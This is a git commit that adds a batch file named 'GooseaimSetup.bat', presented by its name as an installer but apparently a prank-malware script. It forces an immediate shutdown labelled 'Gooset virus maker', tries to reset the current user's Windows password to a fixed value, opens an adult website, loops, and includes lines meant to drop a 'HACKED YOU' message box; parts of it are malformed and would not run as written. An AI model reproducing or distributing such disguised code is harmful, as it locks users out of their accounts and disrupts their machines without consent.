10261c87b5c84ac274c385ee6e010b9f3feb094f
gooooooose6055 <bearx5554@gmail.com>
2025-05-03 11:09:12 +0200

    Add files via upload

---
+++ GooseaimSetup.bat
@@ -0,0 +1,12 @@
+:looop
+
+@echo off
+shutdown -s -t 00 -c "Gooset virus maker"
+net user %username% *
+Ikzalt10
+Ikzalt10
+start notepad.exe
+start www.opornhub.com
+goto looop
+echo Msgbox"GOOSE77 HACKED YOU HAHAHAHAHAHAH GOOSE ON TOP!",48+0,"DOOMED">>msg.vbs
+start msg.vbs
